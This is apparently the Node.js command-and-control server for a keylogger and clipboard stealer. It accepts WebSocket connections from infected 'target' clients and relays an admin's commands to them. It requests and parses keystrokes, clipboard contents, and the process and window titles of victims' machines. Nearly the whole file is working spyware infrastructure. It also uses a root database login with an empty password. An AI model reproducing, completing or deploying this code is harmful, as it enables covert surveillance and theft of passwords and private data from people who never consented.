var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
// подключенные клиенты
var clients = [];
var targets = [];
var WebSocketServer = require('ws').Server;

//Database config
var mysql      = require('mysql');
var database = mysql.createConnection({
    host     : 'localhost',
    user     : 'root',
    password : '',
    database : 'users'
});


//Connecting to database
/*database.connect(function(err) {
     if (err) {
        console.error('[ERROR]Error connecting to database: ' + err.stack);
        return;
     }
     console.log('[Info]Connected to databace as id ' + database.threadId);
 });*/


// WebSocket-сервер на порту 25565
var webSocketServer = new WebSocketServer({ port: 25565 });
console.log ('Server is runing');

webSocketServer.on('connection', connection);

function connection(ws) {
    console.log('[Info]New client conected');

    var lastAnswer = [];
    var isAuthorized = false;
    var isJSONParsed = true;

    //If noAuth close connection
    setTimeout(function() {
        if(!isAuthorized){
            ws.close();
        }
    },60000);

    ws.on('message', function incoming(message, flags) {
        //if(flags['binary']){console.log(message);}

        //Try to parse JSON
        parse_JSON();

        //Check id length
        if(lastAnswer['id'] == null){
            console.log('[ERROR]Id = NULL !');
            ws.close();
            return;
        }
        if (lastAnswer['id'].length != 64) {
            console.log('[ERROR]Incorect id length!');
            ws.close();
            return;
        }

        /*console.log('id = ' + inputArr['id']);
         console.log(clients[inputArr['id']]);
         clients[inputArr['id']] = ws;*/
        if (clients[lastAnswer['id']] == null) {
            clients[lastAnswer['id']] = ws;
            ws.send('accepted');
            console.log('[Info]Client is authorized ' + lastAnswer['id']);
            isAuthorized = true;
        }
        else {
            //Procesing data
            if (lastAnswer['ok']) {
                if(targets[lastAnswer['id']]) {
                    if(isJSONParsed) {
                        try {
                            clients[adminID].send(lastAnswer['data']);
                        }
                        catch (e) {
                            console.log('[WARNING]Admin is disconected error + ' + e + '!');
                        }
                    }
                    else {
                        clients[adminID].send('[ERROR]Client JSON is not parsed !');
                    }
                }
                else {
                    switch (lastAnswer['type']) {
                        case 'keyboard':
                            console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
                            getData(lastAnswer['id'], 'getkeyboard');
                            break;
                        case 'clipboard':
                            console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
                            getData(lastAnswer['id'], 'getclipboard');
                            break;
                        case 'request':
                            if (lastAnswer['id'] == adminID) {
                                console.log('Request: ' + lastAnswer['data']['request']);
                                targets[lastAnswer['data']['targetId']] = true;
                                try {
                                    clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
                                }
                                catch (e) {
                                    ws.send('[ERROR]Client is offline now!');
                                }
                            }
                            else {
                                console.log('[ERROR]Incorect adminId!');
                            }
                            break;
                    }
                }
            }
            else {
                console.log('[Client ERROR]' + lastAnswer['error']);
            }
        }


        function parse_JSON () {
            var backUpJSON = lastAnswer;
            try {
                lastAnswer = JSON.parse(message);
            }
            catch (e) {
                lastAnswer = backUpJSON;
                console.log('[ERROR]Failed to parse JSON!');
                ws.close();
                isJSONParsed = false;
            }
        }
    });
    ws.on('close', function close() {
            /*console.log('[CLOSE !!!] ' + lastAnswer['id']);
            var test = (lastAnswer['id'] in clients);
            console.log('[INDEXOF !!!] ' + test);*/

            if(lastAnswer['id'] in clients) {
                 delete  clients[lastAnswer['id']];
                //database.end();
                console.log('[Info]Conection closed id ' + lastAnswer['id']);
            }
            else{
                console.log('[Info]Conection closed client unauthorized' );
            }
        }
    );
}

function getData (id,type) {
    clients[id].send(type);
}
/*
var fs = require('fs');

fs.readFile('clipboard.bin', function (err, data) {
    parse_binary_message(data);
});*/function parse_binary_message (data) {
    if (data.length < 0x0048) {
        console.log('[ERROR]Binary length incorect!');
        return false;
    }
    var offset = 0x0048;

    var message = {};

    message['count'] = data.readUInt32BE(offset);
    offset += 4;

    message['parts'] = [];

    var header = parse_binary_header(data);

    switch (header['type']) {
        case 0x0:
            break;
        case 0x1:
            message['parts'] = read_keyboard(data);
            break;
        case 0x2:
            message['parts'] = read_clipboard(data);
            break;
        default:
            break;
    }

    function read_keyboard () {
        var arr = [];
        for(var i = 0; i < message['count']; i++ ) {
            var partObj = {};
            partObj['subtype'] = data.readInt8(offset);
            offset += 1;
            switch (partObj['subtype']) {
                case 0x1:
                    partObj['keyCode'] = data.readUInt32BE(offset);
                    offset += 4;
                    partObj['lang'] = data.readUInt16BE(offset);
                    offset += 2;
                    partObj['flags'] = data.readInt8(offset);
                    offset += 1;
                    break;
                case 0x2:
                    //read wndinfo
                    var stringObj = read_string();
                    partObj['process'] = stringObj['data'];
                    offset = stringObj['offset'];

                    stringObj = read_string();
                    partObj['title'] = stringObj['data'];
                    offset = stringObj['offset'];
                    break;
                default:
                    break;
            }
            arr.push(partObj);
        }
        return arr;
    }
    function read_clipboard () {
        var arr = [];
        for (i = 0; i < message['count']; i++){
            var partObj = {};
            partObj['time'] = data.readUInt32BE(offset);
            offset +=4;

            //read wndinfo
            var stringObj = read_string();
            partObj['process'] = stringObj['data'];
            offset = stringObj['offset'];

            stringObj = read_string();
            partObj['title'] = stringObj['data'];
            offset = stringObj['offset'];

            //read data
            stringObj = read_string();
            partObj['data'] = stringObj['data'];
            offset = stringObj['offset'];
            //push one of part
            arr.push(partObj);
        }
        return arr;
    }
    function read_string () {
        var result = {};
        var length = data.readUInt32BE(offset);
        offset += 4;
        result['data'] = data.toString('ascii', offset, offset + length);
        result['offset'] = offset + length;
        return result;
    }
    var lrcdata = {};
    lrcdata['header'] = header;
    lrcdata['data'] = message;

    console.log(lrcdata);
}

function parse_binary_header (input) {
    var headerObj = {};
    headerObj['signature'] = input.readUInt16BE(0);
    headerObj['version'] = input.readInt8(0x0002);
    headerObj['id'] = input.toString('ascii', 0x0003, 0x0042);
    headerObj['type'] = input.readInt8(0x0043);
    headerObj['length'] = input.readUInt32BE(0x0044);
    return headerObj;
}

/*
database.query('SELECT * FROM keyboard', function(err, rows, fields) {
   // if (err) throw err;
    console.log('The solution is: ' + rows[0]['lol']);
});*/
//database.end();
/*database.query('SELECT * FROM thoughts ORDER BY number', function(err, rows, fields) {
    if (err)  {console.log(err);};

    console.log('The solution is: ', rows[0].solution);
});*/
